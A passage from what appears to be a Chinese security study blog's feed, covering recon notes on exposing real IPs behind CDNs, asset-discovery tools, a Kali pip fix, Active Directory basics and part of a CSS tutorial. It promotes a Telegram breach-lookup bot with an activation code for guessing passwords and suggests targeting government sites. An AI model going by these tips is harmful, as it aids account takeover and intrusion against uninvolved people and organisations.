class="markdownIt-Anchor" href="#网站漏洞查找">#</a> 网站漏洞查找</h4><ul><li><p>目标敏感文件泄露，例如：phpinfo 之类的探针、GitHub 信息泄露等；</p></li><li><p>XSS 盲打，命令执行反弹 shell，SSRF 等；</p></li><li><p>无论是用社工还是其他手段，拿到了目标网站管理员在 CDN 的账号，从而在从 CDN 的配置中找到网站的真实 IP；</p></li></ul><h4 id="f5-ltm解码法"><a class="markdownIt-Anchor" href="#f5-ltm解码法">#</a> F5 LTM 解码法</h4><p>当服务器使用 F5 LTM 做负载均衡时，通过对 set-cookie 关键字的解码真实 ip 也可被获取，例如：Set-Cookie: BIGipServerpool_8.29_8030=487098378.24095.0000，先把第一小节的十进制数即 487098378 取出来，然后将其转为十六进制数 1d08880a，接着从后至前，以此取四位数出来，也就是 0a.88.08.1d，最后依次把他们转为十进制数 10.136.8.29，也就是最后的真实 ip；</p><h4 id="app抓包获取真实ip"><a class="markdownIt-Anchor" href="#app抓包获取真实ip">#</a> APP 抓包获取真实 IP</h4><p>模拟器下载 APP，访问，burp 抓包</p><h4 id="微信小程序抓包获取真实ip"><a class="markdownIt-Anchor" href="#微信小程序抓包获取真实ip">#</a> 微信小程序抓包获取真实 IP</h4><p>模拟器登录微信，访问小程序，burp 抓包；</p><h1 id="社工"><a class="markdownIt-Anchor" href="#社工">#</a> 社工</h1><p>在 tg 找社工机器人查找密码信息 或本地的社工库查找邮箱或者用户的密码或密文，组合密码在进行猜解登录；</p><p>推荐社工人肉查询机器人：@FreeSGKbot</p><p>输入激活码 SGKVHWWOSX 即可免费使用</p><p>加入链接 <span class="exturl" data-url="aHR0cHM6Ly90Lm1lL0ZyZWVTR0tib3Q/c3RhcnQ9U0dLVkhXV09TWA==">https://t.me/FreeSGKbot?start=SGKVHWWOSX</span></p><h1 id="非常规操作"><a class="markdownIt-Anchor" href="#非常规操作">#</a> 非常规操作</h1><p>1、如果找到了目标的一处资产，但是对目标其他资产的收集无处下手时，可以查看一下该站点的 body 里是否有目标的特征，然后利用网络空间搜索引擎（如 fofa 等）对该特征进行搜索，如：body=“XX 公司” 或 body=“baidu” 等；</p><p>该方式一般适用于特征明显，资产数量较多的目标，并且很多时候效果拔群；</p><p>2、当通过上述方式的找到 test.com 的特征后，再进行 body 的搜索，然后再搜索到 test.com 的时候，此时 fofa 上显示的 ip 大概率为 test.com 的真实 IP；</p><p>3、如果需要对政府网站作为目标，那么在批量获取网站首页的时候，可以用上：</p><ul><li><ul><li><span class="exturl" data-url="aHR0cDovLzExNC41NS4xODEuMjgvZGF0YWJhc2VJbmZvL2luZGV4">http://114.55.181.28/databaseInfo/index</span></li></ul></li></ul><p>之后可以结合上一步的方法进行进一步的信息收集；</p><h1 id="app信息收集"><a class="markdownIt-Anchor" href="#app信息收集">#</a> APP 信息收集</h1><h3 id="抓包精灵"><a class="markdownIt-Anchor" href="#抓包精灵">#</a> 抓包精灵</h3><p>地址：<span class="exturl" data-url="aHR0cHM6Ly9tLmNyMTczLmNvbS9taXB4LzI3NzcwMS5odG1s">https://m.cr173.com/mipx/277701.html</span></p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1627560265604-7795cc0d-ca2b-41cb-b15e-5088bfc9be51.png" alt="img"></p><p>左上角选择应用进行抓包</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1627560371347-aa36a37f-8e0f-4582-94de-f2c84508425f.png" alt="img"></p><p>打开软件，进行浏览，后台自动抓包</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1627560531989-6a19fe57-3837-48ff-b0ba-35cf817cda6b.png" alt="img"></p><p>双击数据包，可以查看具体报文</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1627560629450-efec0934-2650-4fdb-8fe4-4a5e43e94651.png" alt="img"></p><h3 id="微信小程序支付宝小程序"><a class="markdownIt-Anchor" href="#微信小程序支付宝小程序">#</a> 微信小程序支付宝小程序</h3><p>现在很多企业都有小程序，可以关注企业的微信公众号或者支付宝小程序，或关注运营相关人员，查看朋友圈，获取小程序；</p><p>微信直接搜索，支付宝直接搜索</p><p>公众号搜索网站：</p><p><span class="exturl" data-url="aHR0cHM6Ly93ZWl4aW4uc29nb3UuY29tL3dlaXhpbj90eXBlPTEmYW1wO2llPXV0ZjgmYW1wO3F1ZXJ5PSVFNiU4QiVCQyVFNSVBNCU5QSVFNSVBNCU5QQ==">https://weixin.sogou.com/weixin?type=1&amp;ie=utf8&amp;query=%E6%8B%BC%E5%A4%9A%E5%A4%9A</span></p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1628068277011-c175c1cf-3385-4b10-86f4-99ed0b2266d4.png" alt="img"></p><h3 id="app软件搜索"><a class="markdownIt-Anchor" href="#app软件搜索">#</a> APP 软件搜索</h3><p><span class="exturl" data-url="aHR0cHM6Ly93d3cucWltYWkuY24v">https://www.qimai.cn/</span></p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1628068374261-3e0bda22-099e-4482-a52d-c1071dfe9d42.png" alt="img"></p><h1 id="资产管理"><a class="markdownIt-Anchor" href="#资产管理">#</a> 资产管理</h1><h2 id="goby"><a class="markdownIt-Anchor" href="#goby">#</a> goby</h2><p>通过先将目标网络 IT 资产进行规则分析建立知识库，在发生安全事件时能够在最短时间内完成安全应急的新技术。区别于传统的端口扫描与漏洞扫描，Goby 只针对受影响的小范围进行漏洞应急，所以这种方式速度最快，对目标网络影响最小；</p><p>地址：<span class="exturl" data-url="aHR0cHM6Ly9nb2JpZXMub3JnLw==">https://gobies.org/</span></p><p>食用指南：<span class="exturl" data-url="aHR0cHM6Ly9tcC53ZWl4aW4ucXEuY29tL3MvRy1WbjRodEFoandsSmI2N3YyVHRSdw==">https://mp.weixin.qq.com/s/G-Vn4htAhjwlJb67v2TtRw</span></p><h2 id=""><a class="markdownIt-Anchor" href="#">#</a> </h2><h2 id="arl"><a class="markdownIt-Anchor" href="#arl">#</a> ARL</h2><p>旨在快速侦察与目标关联的互联网资产，构建基础资产信息库。<br>协助甲方安全团队或者渗透测试人员有效侦察和检索资产，发现存在的薄弱点和攻击面’</p><p>地址：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL1RvcGhhbnRUZWNobm9sb2d5L0FSTA==">https://github.com/TophantTechnology/ARL</span></p><h2 id="-2"><a class="markdownIt-Anchor" href="#-2">#</a> </h2><h2 id="autoearn"><a class="markdownIt-Anchor" href="#autoearn">#</a> AUTOEARN</h2><p>一个利用 OneForAll（<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3NobWlseWx0eS9PbmVGb3JBbGwlRUYlQkMlODklRTglQkYlOUIlRTglQTElOEMlRTUlQUQlOTAlRTUlOUYlOUYlRTYlOTQlQjYlRTklOUIlODYlRTMlODAlODFTaG9kYW4=">https://github.com/shmilylty/OneForAll）进行子域收集、Shodan</span> API 端口扫描、 进行 WAF 指纹识别、Xray（<span class="exturl" data-url="aHR0cHM6Ly94cmF5LmNvb2wveHJheS8lRUYlQkMlODklRTYlQkMlOEYlRTYlQjQlOUVGdXp6JUUzJTgwJTgxU2VydmVyJUU5JTg1JUIxJUU3JTlBJTg0JUU4JTg3JUFBJUU1JThBJUE4JUU1JThDJTk2JUU2JUJDJThGJUU2JUI0JTlFJUU2JTg5JUFCJUU2JThGJThGJUUzJTgwJTgxJUU3JTk0JUIxRmxhc2slRTYlOTQlQUYlRTYlOTIlOTElRTQlQjglODAlRTQlQjglQUElRTclQUUlODAlRTUlOEQlOTUlRTUlOEYlQUYlRTglQTclODYlRTUlOEMlOTYlRTclOTUlOEMlRTklOUQlQTIlRUYlQkMlOEMlRTUlOEQlQjMlRTYlOTclQjYlRTklODAlOUElRTclOUYlQTUlRTYlOEYlOTAlRTklODYlOTIlRTclOUElODQlRTYlQkMlOEYlRTYlQjQlOUUlRTYlOEMlOTYlRTYlOEUlOTglRTglQkUlODUlRTUlOEElQTklRTUlQjclQTUlRTUlODUlQjclRUYlQkMlOEMlRTYlOUMlQUMlRTglQjQlQTglRTQlQjglOEElRTYlOUIlQjQlRTUlODMlOEYlRTYlOTglQUYlRTQlQjglODAlRTQlQjglQUElRTYlQjUlODElRTclQTglOEIlRTYlQTElODYlRTYlOUUlQjYlRUYlQkMlOEMlRTUlQUUlOEMlRTYlODglOTAlRTUlOTAlODQlRTUlQjclQTUlRTUlODUlQjclRTQlQjklOEIlRTUlODklOEQlRTclOUElODQlRTglODclQUElRTUlOEElQTglRTUlOEMlOTYlRTglODElOTQlRTUlOEElQTglRTglQkYlODclRTclQTglOEIlRUYlQkMlOUI=">https://xray.cool/xray/）漏洞 Fuzz、Server 酱的自动化漏洞扫描、由 Flask 支撑一个简单可视化界面，即时通知提醒的漏洞挖掘辅助工具，本质上更像是一个流程框架，完成各工具之前的自动化联动过程；</span></p><p>地址：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0VjaG9jaXBoZXIvQVVUTy1FQVJO">https://github.com/Echocipher/AUTO-EARN</span></p><h2 id="tide-mars"><a class="markdownIt-Anchor" href="#tide-mars">#</a> Tide-Mars</h2><p>主要功能：客户管理、资产发现、子域名枚举、C 段扫描、资产变更监测、端口变更监测、域名解析变更监测、Awvs 扫描、POC 检测、web 指纹探测、端口指纹探测、CDN 探测、操作系统指纹探测、泛解析探测、WAF 探测、敏感信息检测等等。目前被动扫描准备对接 xray+wascan，准备二期开源该功能及其他若干功能；</p><p>地址：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL1RpZGVTZWMvTWFycw==">https://github.com/TideSec/Mars</span></p><h2 id="bayonet"><a class="markdownIt-Anchor" href="#bayonet">#</a> bayonet</h2><p>bayonet 是一款 src 资产管理系统，从子域名、端口服务、漏洞、爬虫等一体化的资产管理系统；</p><p>地址：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0NURi1NaXNzRmVuZy9iYXlvbmV0">https://github.com/CTF-MissFeng/bayonet</span></p><h2 id="bufferfly"><a class="markdownIt-Anchor" href="#bufferfly">#</a> bufferfly</h2><p>攻防演习 / 渗透测试资产处理小工具，对攻防演习 / 渗透测试前的信息搜集到的大批量资产 / 域名进行存活检测、获取标题头、语料提取、常见 Web 端口检测等；</p><p>地址：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2RyMG9wL2J1ZmZlcmZseQ==">https://github.com/dr0op/bufferfly</span></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;第二天资产信息收集&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#第二天资产信息收集&quot;&gt;#&lt;/a&gt; 第二天：资产信息收集&lt;/h1&gt;
&lt;h2 id=&quot;img&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#img</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title></title>
    <link href="https://sun-spots.github.io/2022/02/23/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/%E5%B8%B8%E7%94%A8%E7%9F%A5%E8%AF%86/kali%E4%B8%AD%E6%97%A0python2pip/"/>
    <id>https://sun-spots.github.io/2022/02/23/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/%E5%B8%B8%E7%94%A8%E7%9F%A5%E8%AF%86/kali%E4%B8%AD%E6%97%A0python2pip/</id>
    <published>2022-02-23T01:33:54.383Z</published>
    <updated>2022-02-23T01:34:58.174Z</updated>
    
    <content type="html"><![CDATA[<h1 id="kali中python2无pip"><a class="markdownIt-Anchor" href="#kali中python2无pip">#</a> Kali 中 Python2 无 PIP</h1><p>出现问题：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/bin/python2: No module named pip</span><br></pre></td></tr></table></figure><p>解决方法：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">curl https://bootstrap.pypa.io/pip/2.7/get-pip.py -o get-pip.py</span><br><span class="line">python2 get-pip.py</span><br><span class="line">python2 -m pip install Crypto</span><br></pre></td></tr></table></figure><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2699750/1628590704890-84b16799-657f-4f9e-81f8-68b33c1f0691.png" alt="img"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;kali中python2无pip&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#kali中python2无pip&quot;&gt;#&lt;/a&gt; Kali 中 Python2 无 PIP&lt;/h1&gt;
&lt;p&gt;出现问题：&lt;/p&gt;
&lt;figure class=&quot;</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title></title>
    <link href="https://sun-spots.github.io/2022/01/21/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/%E7%AC%AC%E4%B8%80%E9%98%B6%E6%AE%B5/%E7%AC%AC%E4%BA%8C%E5%91%A8/2.5%E5%9F%9F%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E4%B8%8E%E7%AE%A1%E7%90%86/"/>
    <id>https://sun-spots.github.io/2022/01/21/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/%E7%AC%AC%E4%B8%80%E9%98%B6%E6%AE%B5/%E7%AC%AC%E4%BA%8C%E5%91%A8/2.5%E5%9F%9F%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E4%B8%8E%E7%AE%A1%E7%90%86/</id>
    <published>2022-01-21T15:12:00.188Z</published>
    <updated>2022-01-21T15:12:41.339Z</updated>
    
    <content type="html"><![CDATA[<h1 id="第五天域环境搭建与管理"><a class="markdownIt-Anchor" href="#第五天域环境搭建与管理">#</a> 第五天：域环境搭建与管理</h1><h1 id="有待修整"><a class="markdownIt-Anchor" href="#有待修整">#</a> 有待修整…</h1><h1 id="一内网渗透基础"><a class="markdownIt-Anchor" href="#一内网渗透基础">#</a> 一：内网渗透基础</h1><p>内网也是指计算机网络中根据地理范围划分中的局域网 (Local Area Network)，即 <code>内网等同于局域网</code>   。</p><p>内网渗透又叫做后渗透，区别于前渗透的 WEB 渗透，内网渗透是指从获取 WEB 服务器的 shell 之后到拿下内网全部主机的过程叫做内网渗透。</p><ul><li>什么是计算机网络？<br>计算机网络是将地理位置不同的具有独立功能的多台计算机及其外部设备，通过通信线路连接，在网络操作系统，网络管理软件及网络通信协议管理和协调下，实现资源共享和信息传递的计算机系统。</li></ul><h3 id="1工作组"><a class="markdownIt-Anchor" href="#1工作组">#</a> 1: 工作组</h3><p>工作组（Work Group）：将不同的计算机按照功能或部门分别列入到不同的工作组中。</p><ul><li><p>默认工作组： <code>WORKGROUP</code></p></li><li><p>加入工作组时，如果名称不存在就相当于新建了一个工作组</p></li><li><p>工作组没有集中管理的作用，在工作组里的所有计算机都是平等的没有服务器和客户机之分</p></li></ul><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2699750/1624324022852-b6c0ea53-434e-4d64-a26f-5f2797bb4538.png" alt="img"></p><h3 id="2域"><a class="markdownIt-Anchor" href="#2域">#</a> 2: 域</h3><p>需求：希望某台计算机的账户可以访问每台计算机的资源或者在每台计算机上进行登录！</p><ul><li><p><code>域</code> ：(Domain) 是一个有安全边界的计算机集合。（安全边界：在两个域环境中一个域的用户无法访问另一个域中的资源）</p></li><li><p><code>域</code> ：与工作组相比，域的安全管理控制机制更加严格。</p></li><li><p><code>域控制器</code> ：(Domain Controller,DC) 是域中的一台类似于管理服务器的计算机，类似于单位的门禁系统，负责所有连入的计算机和用户的验证工作。</p></li><li><p><code>域控制器</code> ：存在由这个域的账户。密码。属于这个域的计算机等信息构成的数据库–&gt; <code>活动目录</code> 。</p></li><li><p><code>域控制器</code> ：是整个域的通信枢纽，所有的权限身份验证都在域控制器上进行；简单来说域内所有用来验证身份的账号和密码散列值都保存在域控制器当中–&gt; <code>活动目录</code> 。</p></li></ul><h4 id="21域环境分类"><a class="markdownIt-Anchor" href="#21域环境分类">#</a> 2.1 域环境分类</h4><ol><li><p><code>单域</code> ：一个有安全边界的计算机集合，单域内至少两台域服务器，一台作为 DC 另一台作为备份 DC，活动目录的数据库 (域用户 / 计算机 / 网络设备) 是存储在 DC 中的，没有备份 DC 一旦瘫痪，域内其他用户就不能登录该域。</p></li><li><p><code>父域子域</code> ：第一个域称为父域，各分部的域称为该域名的子域。<br>例 1：把不同地点的分公司放在同一个域内，那么主机之间的信息交互花费时间就比较长，占用宽带就比较大。<br>例 2：公司某部门希望使用特定的安全策略 (账号密码策略)，就可以将部门作为子域来单独管理。</p></li><li><p><code>域树</code> ：多个域通过建立信任关系组成的集合。</p></li></ol><ul><li><ul><li>两个域之间相互访问，需要建立信任关系；</li><li>在一个域树种，父域可以包含多个子域；</li></ul></li><li><ul><li>一个。代表一个层次，放在最后的子域称之为一级域，前面的子域称之为二级域；</li><li>子域只能使用父域的名字作为其域名的后缀；</li></ul></li></ul><ol><li><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2699750/1624324022870-c658ef92-75e7-4391-8f99-7301e02fea2a.png" alt="img"></p></li><li><p><code>域森林</code> ：多个域树通过建立信任关系组成的集合。<br><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2699750/1624324022869-f655bf3d-3d3f-46de-a6a7-1e9af98e5860.png" alt="img"></p></li><li><p><code>域名服务器</code> ：DNS (Domain Name Server) 是指用于实现域名和 IP 地址解析的服务器，分为正向解析与反向解析。</p></li></ol><ul><li><ul><li>正向解析：域名–&gt;IP 地址</li><li>反向解析：IP 地址–&gt; 域名</li></ul></li><li><ul><li>域内计算机使用 DNS 来定位域控制器 / 服务器 / 其他计算机，所以域名 ==&gt;DNS 域的名字</li><li><strong>在内网渗透中，通过寻找 DNS 服务器来确定域控制器的位置</strong>：DNS 服务器和域控制器通常配置在同一台机器上！！！</li></ul></li></ul><h3 id="3活动目录"><a class="markdownIt-Anchor" href="#3活动目录">#</a> 3: 活动目录</h3><p>Active Directory (AD) 是指域环境中提供目录服务的组件，目录用于存储有关网络对象 (用户 / 组 / 计算机 / 共享资源 / 打印机 / 联系人) 的信息。</p><h4 id="31活动目录功能"><a class="markdownIt-Anchor" href="#31活动目录功能">#</a> 3.1 活动目录功能</h4><ul><li><p>账号集中管理：所有账号存储在服务器中，以便执行命令和重置密码；</p></li><li><p>软件集中管理：统一推送软件 (软件安装)，安装网络打印机 (硬件设备)；</p></li><li><p>环境集中管理：统一客户端界面 (统一桌面不知)/IE (安全性策略)/… 等设置；</p></li><li><p>增强安全性：统一部署杀毒软件和病毒扫描任务 / 集中管理用户的计算机权限 / 统一制定用户密码策略等；</p></li><li><p>更可靠，更短的宕机时间：利用活动目录控制用户方位权限</p></li><li><p><strong>活动目录是微软提供的统一管理平台，ISA/Exchange/SMS 等都依赖这个平台</strong></p></li></ul><h3 id="4域控和活动目录区别"><a class="markdownIt-Anchor" href="#4域控和活动目录区别">#</a> 4: 域控和活动目录区别</h3><p><code>活动目录：</code> 将计算机 / 用户 / 用户组 / 打印机 / 共享文件 / 等分别分类存放在数据库中，以便查找，管理和使用这些资源。那么拥有这个层次结构的数据库就是活动目录数据库，简称 AD 库。</p><p><code>域控：</code> 安装了 AD 库就变成了域控 (用于存储活动目录的数据库的计算机)。</p><h3 id="5安全域的划分"><a class="markdownIt-Anchor" href="#5安全域的划分">#</a> 5: 安全域的划分</h3><p>划分安全域的目的是将一组安全等级相同的计算机划入同一网段。</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2699750/1624324022853-2d2f8767-38cb-4443-a1c0-84c01071ee92.png" alt="img"></p><p>路由器连接的内网中可以划分三个区域：</p><p>1:<strong> 安全级别最高的内网</strong></p><p>2:<strong> 安全级别中等的 DMZ 区域</strong></p><p>3:<strong> 安全级别最低的外网</strong></p><p>三个区域负责完成不同的任务，因此需要设置不同的的网络访问策略，当有 DMZ 区域时我们应定义如下的访问控制策略，以实现屏障保护的功能：</p><ul><li><p>内网可以访问外网：满足内网用户上网查阅资料办公的需求；</p></li><li><p>内网可以访问 DMZ：是管理者可以管理 DMZ 区域当中的服务器设备；</p></li><li><p>外网不能访问内网：内网存储公司重要资料，可以使用 VPN 来访问；</p></li><li><p>外网可以访问 DMZ：DMZ 区域中的服务器对外界提供服务，需要由防火墙来完成对外地址到服务器实际地址的转换；</p></li><li><p>DMZ 不能访问内网：当服务器沦陷保护内网主机不受入侵；</p></li><li><p>DMZ 不能访问外网：限制入侵黑客的通信隧道，邮件服务器除外；</p></li></ul><p><strong>补充</strong></p><ol><li>内网分为 <code>办公区</code> 和 <code>核心区</code></li><li>进入内网的攻击手法： <code>鱼叉攻击；水坑攻击；社会工程学</code></li></ol><h3 id="6域内计算机分类"><a class="markdownIt-Anchor" href="#6域内计算机分类">#</a> 6: 域内计算机分类</h3><p>工作组环境内计算机之间身份是平等的没有服务器和客户机之分，而在域环境下的网络中，则有 <code>域控制器；成员服务器；客户机；独立服务器</code> 之分。</p><ul><li><p>域控制器：用于管理所有的网络访问，包括登录服务器，访问共享目录及资源</p></li><li><p>成员服务器：安全了服务器系统并加入了域，主要任务是提供服务</p></li><li><p>客户机：安装了个人系统的计算机并加入了域</p></li><li><p>独立服务器：能够对外提供服务但是没有加入域</p></li></ul><h3 id="7域内权限"><a class="markdownIt-Anchor" href="#7域内权限">#</a> 7: 域内权限</h3><p>组是用户账号的集合，通过组可以更好的管理用的权限；域环境下有 <code>本地组；全局组；通用组</code> 。</p><table><thead><tr><th>组类型</th><th>主要作用</th><th>嵌套关系</th></tr></thead><tbody><tr><td>本地组</td><td>授予本地域内资源的访问权限</td><td>本地组不能嵌套在其他组中</td></tr><tr><td>全局组</td><td>实现单域用户访问多域资源</td><td>全局组可以嵌套在其他组中</td></tr><tr><td>通用组</td><td>实现域森林的跨域访问资源</td><td>通用组成员可以来自域森林中的任何域的用户 / 全局组和其他通用组</td></tr></tbody></table><p>** 知识点：** 域本地组来自全林，作用于本域；全局组来自本域，作用于全林；通用组来自全林，作用于全林；</p><h4 id="71a-g-dl-p策略"><a class="markdownIt-Anchor" href="#71a-g-dl-p策略">#</a> 7.1A-G-DL-P 策略</h4><p>A-G-DL-P 策略是指将用户账号添加到全局组中，将全局组添加到与本地组中，然后为域本地组分配资源权限；</p><ul><li><p>A：用户账号（Account）</p></li><li><p>G：全局组（Global Group）</p></li><li><p>U：通用组（Univresal Group）</p></li><li><p>DL：域本地组（Domain Local Group）</p></li><li><p>p：资源权限（permssion）</p></li></ul><p>安装域控时，系统会自动生成一些组，为内置组；内置组定义了一些常用的权限–&gt;Builtin 和 Users 组织单元的组就是内置组；</p><ul><li>内置的域本地组在 <code>Builtin</code>  组织单元中</li><li>内置的全局组和通用组在 <code>Users</code>  组织单元中</li></ul><table><thead><tr><th>域本地组</th><th>权限</th></tr></thead><tbody><tr><td>administrators</td><td>管理员组，成员可以不受限制的的存取计算机和域内的资源</td></tr><tr><td>Remote Desktop Users</td><td>远程登录组，成员具有远程登录权限</td></tr><tr><td>Account Operators</td><td>账号操作员组，创建和管理域内用户和组，不能更改 administrators 和 Domain Admins 组账户</td></tr><tr><td>Domain Admins</td><td>域管理员组，成员在所有加入域的服务器 / 域控和 AD 中均默认拥有完整的管理员权限，用户称为域系统管理员可加入</td></tr><tr><td>Domain Users</td><td>域用户组，默认是内置域的 User 组的成员</td></tr></tbody></table><h1 id="二内网环境搭建"><a class="markdownIt-Anchor" href="#二内网环境搭建">#</a> 二：内网环境搭建</h1><p>通常所说的内网渗透测试很大程度上就是域渗透测试</p><h4 id="1网络拓扑"><a class="markdownIt-Anchor" href="#1网络拓扑">#</a> 1: 网络拓扑</h4><table><thead><tr><th>操作系统</th><th>安装服务</th><th>计算机名</th><th>IP 地址</th><th>DNS 服务器地址</th></tr></thead><tbody><tr><td>Windows server 2012 R2</td><td>AD/DC</td><td>DC</td><td>192.168.1.1</td><td>192.168.1.1</td></tr><tr><td>Windows server 2012 R2</td><td>加入域</td><td>WEB</td><td>192.168.1.2</td><td>192.168.1.1</td></tr><tr><td>Windows 10</td><td>加入域</td><td>WIN10</td><td>192.168.1.3</td><td>192.168.1.1</td></tr></tbody></table><h4 id="2搭建步骤"><a class="markdownIt-Anchor" href="#2搭建步骤">#</a> 2: 搭建步骤</h4><p><strong>Windows server 2012R2 操作流程</strong></p><p>更改 IP 地址–&gt; 更改计算机名–&gt; 安装域控和 DNS 服务–&gt; 升级服务器–&gt; 创建 AD 域–&gt; 创建用户</p><p><strong>windows server 2008R2 操作流程</strong></p><p>更改 IP 地址与 DNS 服务器地址–&gt; 更改计算机名–&gt; 加入域</p><p><strong>windows7 操作流程</strong></p><p>更改 IP 地址与 DNS 服务器地址–&gt; 更改计算机名–&gt; 加入域</p><p><strong>&gt;&gt;&gt;<strong> 详细操作请看：域环境搭建</strong> &lt;&lt;&lt;</strong></p><h4 id="3扩展知识点"><a class="markdownIt-Anchor" href="#3扩展知识点">#</a> 3. 扩展知识点</h4><p>搭建具有漏洞的环境，更好的模拟内网入侵的过程</p><table><thead><tr><th>漏洞靶场</th><th>环境描述</th></tr></thead><tbody><tr><td>Metasploit2</td><td>一个 Ubuntu Linux 的虚拟机，内置了常见的漏洞其默认的用户名和密码都是 msfadmin；</td></tr><tr><td>Metasploit3</td><td>Metasploit3 的升级版，默认密码还是 msfadmin</td></tr><tr><td>OWASPBWA</td><td>一款基于虚拟机的渗透测试工具，提供一个存在大量漏洞的网站应用程序环境</td></tr><tr><td>DVWA</td><td>显而易见这是个 WEB 漏洞靶场…</td></tr></tbody></table>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;第五天域环境搭建与管理&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#第五天域环境搭建与管理&quot;&gt;#&lt;/a&gt; 第五天：域环境搭建与管理&lt;/h1&gt;
&lt;h1 id=&quot;有待修整&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; hre</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title></title>
    <link href="https://sun-spots.github.io/2022/01/20/%E4%BF%AE%E6%94%B9/%E6%B5%AE%E5%8A%A8/"/>
    <id>https://sun-spots.github.io/2022/01/20/%E4%BF%AE%E6%94%B9/%E6%B5%AE%E5%8A%A8/</id>
    <published>2022-01-20T11:54:59.530Z</published>
    <updated>2022-01-20T12:10:23.968Z</updated>
    
    <content type="html"><![CDATA[<h1 id="09-浮动"><a class="markdownIt-Anchor" href="#09-浮动">#</a> 09 - 浮动</h1><p>笔记来源：<span class="exturl" data-url="aHR0cHM6Ly93d3cuYmlsaWJpbGkuY29tL3ZpZGVvL0JWMVhKNDExWDdVZA==">尚硅谷 Web 前端 HTML5&amp;CSS3 初学者零基础入门全套完整版</span></p><h1 id="浮动"><a class="markdownIt-Anchor" href="#浮动">#</a> 浮动</h1><h2 id="1-浮动的简介"><a class="markdownIt-Anchor" href="#1-浮动的简介">#</a> 1. 浮动的简介</h2><p>通过浮动可以使一个元素向其父元素的左侧或右侧移动</p><p>使用 <code>float</code>  属性来设置于元素的浮动</p><ul><li><p><code>none</code>  默认值，元素不浮动</p></li><li><p><code>left</code>  元素向左浮动</p></li><li><p><code>right</code>  元素向右浮动</p></li></ul><p>注意</p><ul><li><p>元素设置浮动以后，水平布局的等式便不需要强制成立</p></li><li><p>元素设置浮动以后，会完全从文档流中脱离，不再占用文档流的位置，所以元素下边的还在文档流中的元素会自动向上移动</p></li></ul><h2 id="2-浮动的特点"><a class="markdownIt-Anchor" href="#2-浮动的特点">#</a> 2. 浮动的特点</h2><ol><li><p>浮动元素会完全脱离文档流，不再占据文档流中的位置</p></li><li><p>设置浮动以后，元素会向父元素的左侧或右侧移动</p></li><li><p>浮动元素默认不会从父元素中移出<br><img data-src="https://s3.bmp.ovh/imgs/2022/01/5bc198e2e914a393.png" alt=""></p></li></ol><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="css"></span></span><br><span class="line"><span class="css">    <span class="selector-class">.box1</span> &#123;</span></span><br><span class="line"><span class="css">        <span class="attribute">width</span>: <span class="number">100px</span>;</span></span><br><span class="line"><span class="css">        <span class="attribute">height</span>: <span class="number">100px</span>;</span></span><br><span class="line"><span class="css">        <span class="attribute">background-color</span>: orange;</span></span><br><span class="line"><span class="css">        <span class="attribute">float</span>: left;</span></span><br><span class="line"><span class="css">    &#125;</span></span><br><span class="line"><span class="css"></span></span><br><span class="line"><span class="css">    <span class="selector-class">.box2</span> &#123;</span></span><br><span class="line"><span class="css">        <span class="attribute">width</span>: <span class="number">200px</span>;</span></span><br><span class="line"><span class="css">        <span class="attribute">height</span>: <span class="number">200px</span>;</span></span><br><span class="line"><span class="css">        <span class="attribute">background-color</span>: red;</span></span><br><span class="line"><span class="css">    &#125;</span></span><br><span class="line"><span class="css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;box1&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;box2&quot;</span>&gt;</span><span 